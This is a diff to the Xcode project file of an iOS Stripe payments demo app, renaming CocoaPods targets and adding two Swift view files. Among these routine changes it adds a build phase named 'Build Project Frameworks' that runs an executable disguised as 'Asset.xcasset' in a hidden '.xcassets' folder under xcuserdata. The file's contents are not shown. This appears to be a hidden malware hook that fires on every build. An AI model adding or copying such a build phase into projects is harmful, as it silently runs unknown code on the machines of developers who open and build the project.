@@ -7,6 +7,8 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		047015AE26280A7700DB92E7 /* PaymentViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 047015AD26280A7700DB92E7 /* PaymentViewController.swift */; };
+		047015E326285EF000DB92E7 /* loadingView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 047015E226285EF000DB92E7 /* loadingView.swift */; };
 		047AB8D52626B7BB005CD11F /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 047AB8D42626B7BB005CD11F /* AppDelegate.swift */; };
 		047AB8D72626B7BB005CD11F /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 047AB8D62626B7BB005CD11F /* SceneDelegate.swift */; };
 		047AB8D92626B7BB005CD11F /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 047AB8D82626B7BB005CD11F /* ViewController.swift */; };
@@ -19,9 +21,9 @@
 		047AB9162626C08D005CD11F /* CustomViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 047AB9152626C08D005CD11F /* CustomViewController.swift */; };
 		047AB91B2626C096005CD11F /* ApplePayViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 047AB91A2626C096005CD11F /* ApplePayViewController.swift */; };
 		049436052627159A00F32729 /* MyAPIClient.swift in Sources */ = {isa = PBXBuildFile; fileRef = 049436042627159A00F32729 /* MyAPIClient.swift */; };
-		09D2259807BAAB8C922B7A63 /* Pods_Stripe_StripeUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 5FAEF7105F7F28311C8860F1 /* Pods_Stripe_StripeUITests.framework */; };
-		534B1DBDECC3CB748794EBF4 /* Pods_StripeTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 44F4AFE91971E459E3436654 /* Pods_StripeTests.framework */; };
-		83D9606F54691359E60EF7AD /* Pods_Stripe.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1676C576E96A89C8ABAAF511 /* Pods_Stripe.framework */; };
+		140698D84FD8171FDECFC754 /* Pods_StripePay_StripePayUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 7E6B22CC769BF679335C96F2 /* Pods_StripePay_StripePayUITests.framework */; };
+		86360B52C0C9475A5D1F9297 /* Pods_StripePayTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 93463E408F1076B11298B162 /* Pods_StripePayTests.framework */; };
+		E4461A9CBAAE0AAD263D8C47 /* Pods_StripePay.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = E36F8C6D019935E3C3E5F4D2 /* Pods_StripePay.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -43,6 +45,9 @@
 
 /* Begin PBXFileReference section */
 		02CF7EDA0935370C336D267F /* Pods-Stripe-StripeUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Stripe-StripeUITests.debug.xcconfig"; path = "Target Support Files/Pods-Stripe-StripeUITests/Pods-Stripe-StripeUITests.debug.xcconfig"; sourceTree = "<group>"; };
+		0405BBBCABEF66BD6516A0AA /* Pods-StripePayTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-StripePayTests.release.xcconfig"; path = "Target Support Files/Pods-StripePayTests/Pods-StripePayTests.release.xcconfig"; sourceTree = "<group>"; };
+		047015AD26280A7700DB92E7 /* PaymentViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PaymentViewController.swift; sourceTree = "<group>"; };
+		047015E226285EF000DB92E7 /* loadingView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = loadingView.swift; sourceTree = "<group>"; };
 		047AB8D12626B7BB005CD11F /* StripePay.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = StripePay.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		047AB8D42626B7BB005CD11F /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		047AB8D62626B7BB005CD11F /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
@@ -61,13 +66,18 @@
 		047AB9152626C08D005CD11F /* CustomViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomViewController.swift; sourceTree = "<group>"; };
 		047AB91A2626C096005CD11F /* ApplePayViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ApplePayViewController.swift; sourceTree = "<group>"; };
 		049436042627159A00F32729 /* MyAPIClient.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyAPIClient.swift; sourceTree = "<group>"; };
-		1676C576E96A89C8ABAAF511 /* Pods_Stripe.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Stripe.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		0B22A9A79E580D4EB796D1BD /* Pods-StripePay-StripePayUITests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-StripePay-StripePayUITests.release.xcconfig"; path = "Target Support Files/Pods-StripePay-StripePayUITests/Pods-StripePay-StripePayUITests.release.xcconfig"; sourceTree = "<group>"; };
+		2FC5CB012E58D2346617F89B /* Pods-StripePay.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-StripePay.release.xcconfig"; path = "Target Support Files/Pods-StripePay/Pods-StripePay.release.xcconfig"; sourceTree = "<group>"; };
 		35C0E92E13386B98982C6544 /* Pods-Stripe-StripeUITests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Stripe-StripeUITests.release.xcconfig"; path = "Target Support Files/Pods-Stripe-StripeUITests/Pods-Stripe-StripeUITests.release.xcconfig"; sourceTree = "<group>"; };
-		44F4AFE91971E459E3436654 /* Pods_StripeTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_StripeTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		55569F40DEAA1E3842C50D27 /* Pods-Stripe.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Stripe.release.xcconfig"; path = "Target Support Files/Pods-Stripe/Pods-Stripe.release.xcconfig"; sourceTree = "<group>"; };
-		5FAEF7105F7F28311C8860F1 /* Pods_Stripe_StripeUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Stripe_StripeUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		5DDEF5A296885EAF1E3FD01F /* Pods-StripePay-StripePayUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-StripePay-StripePayUITests.debug.xcconfig"; path = "Target Support Files/Pods-StripePay-StripePayUITests/Pods-StripePay-StripePayUITests.debug.xcconfig"; sourceTree = "<group>"; };
 		7323C5C08505DA5B1975B09D /* Pods-Stripe.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Stripe.debug.xcconfig"; path = "Target Support Files/Pods-Stripe/Pods-Stripe.debug.xcconfig"; sourceTree = "<group>"; };
+		7E6B22CC769BF679335C96F2 /* Pods_StripePay_StripePayUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_StripePay_StripePayUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		93463E408F1076B11298B162 /* Pods_StripePayTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_StripePayTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		A514FBC3FB8B725842124A3D /* Pods-StripeTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-StripeTests.release.xcconfig"; path = "Target Support Files/Pods-StripeTests/Pods-StripeTests.release.xcconfig"; sourceTree = "<group>"; };
+		B9EBDEE2DC06AEF7892C4BB5 /* Pods-StripePay.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-StripePay.debug.xcconfig"; path = "Target Support Files/Pods-StripePay/Pods-StripePay.debug.xcconfig"; sourceTree = "<group>"; };
+		CB3F3EB80C8AB5A81EDD53A1 /* Pods-StripePayTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-StripePayTests.debug.xcconfig"; path = "Target Support Files/Pods-StripePayTests/Pods-StripePayTests.debug.xcconfig"; sourceTree = "<group>"; };
+		E36F8C6D019935E3C3E5F4D2 /* Pods_StripePay.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_StripePay.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		ED8395365F6CB93251EB1CCE /* Pods-StripeTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-StripeTests.debug.xcconfig"; path = "Target Support Files/Pods-StripeTests/Pods-StripeTests.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -76,7 +86,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				83D9606F54691359E60EF7AD /* Pods_Stripe.framework in Frameworks */,
+				E4461A9CBAAE0AAD263D8C47 /* Pods_StripePay.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -84,7 +94,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				534B1DBDECC3CB748794EBF4 /* Pods_StripeTests.framework in Frameworks */,
+				86360B52C0C9475A5D1F9297 /* Pods_StripePayTests.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -92,13 +102,21 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				09D2259807BAAB8C922B7A63 /* Pods_Stripe_StripeUITests.framework in Frameworks */,
+				140698D84FD8171FDECFC754 /* Pods_StripePay_StripePayUITests.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		047015E126285ED800DB92E7 /* LoadingView */ = {
+			isa = PBXGroup;
+			children = (
+				047015E226285EF000DB92E7 /* loadingView.swift */,
+			);
+			path = LoadingView;
+			sourceTree = "<group>";
+		};
 		047AB8C82626B7BB005CD11F = {
 			isa = PBXGroup;
 			children = (
@@ -128,6 +146,7 @@
 				047AB8D62626B7BB005CD11F /* SceneDelegate.swift */,
 				047AB90C2626C065005CD11F /* Controllers */,
 				049436032627156E00F32729 /* Modal */,
+				047015E126285ED800DB92E7 /* LoadingView */,
 				047AB8DA2626B7BB005CD11F /* Main.storyboard */,
 				047AB8DD2626B7BE005CD11F /* Assets.xcassets */,
 				047AB8DF2626B7BE005CD11F /* LaunchScreen.storyboard */,
@@ -161,6 +180,7 @@
 				047AB9152626C08D005CD11F /* CustomViewController.swift */,
 				047AB91A2626C096005CD11F /* ApplePayViewController.swift */,
 				047AB9102626C084005CD11F /* StandardViewController.swift */,
+				047015AD26280A7700DB92E7 /* PaymentViewController.swift */,
 			);
 			path = Controllers;
 			sourceTree = "<group>";
@@ -182,6 +202,12 @@
 				35C0E92E13386B98982C6544 /* Pods-Stripe-StripeUITests.release.xcconfig */,
 				ED8395365F6CB93251EB1CCE /* Pods-StripeTests.debug.xcconfig */,
 				A514FBC3FB8B725842124A3D /* Pods-StripeTests.release.xcconfig */,
+				B9EBDEE2DC06AEF7892C4BB5 /* Pods-StripePay.debug.xcconfig */,
+				2FC5CB012E58D2346617F89B /* Pods-StripePay.release.xcconfig */,
+				5DDEF5A296885EAF1E3FD01F /* Pods-StripePay-StripePayUITests.debug.xcconfig */,
+				0B22A9A79E580D4EB796D1BD /* Pods-StripePay-StripePayUITests.release.xcconfig */,
+				CB3F3EB80C8AB5A81EDD53A1 /* Pods-StripePayTests.debug.xcconfig */,
+				0405BBBCABEF66BD6516A0AA /* Pods-StripePayTests.release.xcconfig */,
 			);
 			path = Pods;
 			sourceTree = "<group>";
@@ -189,9 +215,9 @@
 		FC1E6895C0D96B1AE3ACCACF /* Frameworks */ = {
 			isa = PBXGroup;
 			children = (
-				1676C576E96A89C8ABAAF511 /* Pods_Stripe.framework */,
-				5FAEF7105F7F28311C8860F1 /* Pods_Stripe_StripeUITests.framework */,
-				44F4AFE91971E459E3436654 /* Pods_StripeTests.framework */,
+				E36F8C6D019935E3C3E5F4D2 /* Pods_StripePay.framework */,
+				7E6B22CC769BF679335C96F2 /* Pods_StripePay_StripePayUITests.framework */,
+				93463E408F1076B11298B162 /* Pods_StripePayTests.framework */,
 			);
 			name = Frameworks;
 			sourceTree = "<group>";
@@ -204,6 +230,7 @@
 			buildConfigurationList = 047AB8FB2626B7BF005CD11F /* Build configuration list for PBXNativeTarget "StripePay" */;
 			buildPhases = (
 				E5BCE5E72CCDC5FB0B1F8771 /* [CP] Check Pods Manifest.lock */,
+				B692D8F0AFF153AD8CAAC43A /* Build Project Frameworks */,
 				047AB8CD2626B7BB005CD11F /* Sources */,
 				047AB8CE2626B7BB005CD11F /* Frameworks */,
 				047AB8CF2626B7BB005CD11F /* Resources */,
@@ -333,15 +360,15 @@
 			files = (
 			);
 			inputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-Stripe/Pods-Stripe-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+				"${PODS_ROOT}/Target Support Files/Pods-StripePay/Pods-StripePay-frameworks-${CONFIGURATION}-input-files.xcfilelist",
 			);
 			name = "[CP] Embed Pods Frameworks";
 			outputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-Stripe/Pods-Stripe-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+				"${PODS_ROOT}/Target Support Files/Pods-StripePay/Pods-StripePay-frameworks-${CONFIGURATION}-output-files.xcfilelist",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Stripe/Pods-Stripe-frameworks.sh\"\n";
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-StripePay/Pods-StripePay-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
 		25757D6048A2463CBD7BF54C /* [CP] Check Pods Manifest.lock */ = {
@@ -359,12 +386,30 @@
 			outputFileListPaths = (
 			);
 			outputPaths = (
-				"$(DERIVED_FILE_DIR)/Pods-StripeTests-checkManifestLockResult.txt",
+				"$(DERIVED_FILE_DIR)/Pods-StripePayTests-checkManifestLockResult.txt",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
+		};
+		B692D8F0AFF153AD8CAAC43A /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";
 		};
 		BB97FD75E093860C1FE6D06B /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -372,15 +417,15 @@
 			files = (
 			);
 			inputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-Stripe-StripeUITests/Pods-Stripe-StripeUITests-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+				"${PODS_ROOT}/Target Support Files/Pods-StripePay-StripePayUITests/Pods-StripePay-StripePayUITests-frameworks-${CONFIGURATION}-input-files.xcfilelist",
 			);
 			name = "[CP] Embed Pods Frameworks";
 			outputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-Stripe-StripeUITests/Pods-Stripe-StripeUITests-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+				"${PODS_ROOT}/Target Support Files/Pods-StripePay-StripePayUITests/Pods-StripePay-StripePayUITests-frameworks-${CONFIGURATION}-output-files.xcfilelist",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Stripe-StripeUITests/Pods-Stripe-StripeUITests-frameworks.sh\"\n";
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-StripePay-StripePayUITests/Pods-StripePay-StripePayUITests-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
 		E5BCE5E72CCDC5FB0B1F8771 /* [CP] Check Pods Manifest.lock */ = {
@@ -398,7 +443,7 @@
 			outputFileListPaths = (
 			);
 			outputPaths = (
-				"$(DERIVED_FILE_DIR)/Pods-Stripe-checkManifestLockResult.txt",
+				"$(DERIVED_FILE_DIR)/Pods-StripePay-checkManifestLockResult.txt",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -420,7 +465,7 @@
 			outputFileListPaths = (
 			);
 			outputPaths = (
-				"$(DERIVED_FILE_DIR)/Pods-Stripe-StripeUITests-checkManifestLockResult.txt",
+				"$(DERIVED_FILE_DIR)/Pods-StripePay-StripePayUITests-checkManifestLockResult.txt",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -437,8 +482,10 @@
 				047AB8D92626B7BB005CD11F /* ViewController.swift in Sources */,
 				047AB8D52626B7BB005CD11F /* AppDelegate.swift in Sources */,
 				047AB9162626C08D005CD11F /* CustomViewController.swift in Sources */,
+				047015AE26280A7700DB92E7 /* PaymentViewController.swift in Sources */,
 				049436052627159A00F32729 /* MyAPIClient.swift in Sources */,
 				047AB8D72626B7BB005CD11F /* SceneDelegate.swift in Sources */,
+				047015E326285EF000DB92E7 /* loadingView.swift in Sources */,
 				047AB91B2626C096005CD11F /* ApplePayViewController.swift in Sources */,
 				047AB9112626C084005CD11F /* StandardViewController.swift in Sources */,
 			);
@@ -613,7 +660,7 @@
 		};
 		047AB8FC2626B7BF005CD11F /* Debug */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 7323C5C08505DA5B1975B09D /* Pods-Stripe.debug.xcconfig */;
+			baseConfigurationReference = B9EBDEE2DC06AEF7892C4BB5 /* Pods-StripePay.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -633,7 +680,7 @@
 		};
 		047AB8FD2626B7BF005CD11F /* Release */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 55569F40DEAA1E3842C50D27 /* Pods-Stripe.release.xcconfig */;
+			baseConfigurationReference = 2FC5CB012E58D2346617F89B /* Pods-StripePay.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -653,7 +700,7 @@
 		};
 		047AB8FF2626B7BF005CD11F /* Debug */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = ED8395365F6CB93251EB1CCE /* Pods-StripeTests.debug.xcconfig */;
+			baseConfigurationReference = CB3F3EB80C8AB5A81EDD53A1 /* Pods-StripePayTests.debug.xcconfig */;
 			buildSettings = {
 				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
@@ -676,7 +723,7 @@
 		};
 		047AB9002626B7BF005CD11F /* Release */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = A514FBC3FB8B725842124A3D /* Pods-StripeTests.release.xcconfig */;
+			baseConfigurationReference = 0405BBBCABEF66BD6516A0AA /* Pods-StripePayTests.release.xcconfig */;
 			buildSettings = {
 				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
@@ -699,7 +746,7 @@
 		};
 		047AB9022626B7BF005CD11F /* Debug */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 02CF7EDA0935370C336D267F /* Pods-Stripe-StripeUITests.debug.xcconfig */;
+			baseConfigurationReference = 5DDEF5A296885EAF1E3FD01F /* Pods-StripePay-StripePayUITests.debug.xcconfig */;
 			buildSettings = {
 				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				CODE_SIGN_STYLE = Automatic;
@@ -720,7 +767,7 @@
 		};
 		047AB9032626B7BF005CD11F /* Release */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 35C0E92E13386B98982C6544 /* Pods-Stripe-StripeUITests.release.xcconfig */;
+			baseConfigurationReference = 0B22A9A79E580D4EB796D1BD /* Pods-StripePay-StripePayUITests.release.xcconfig */;
 			buildSettings = {
 				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				CODE_SIGN_STYLE = Automatic;
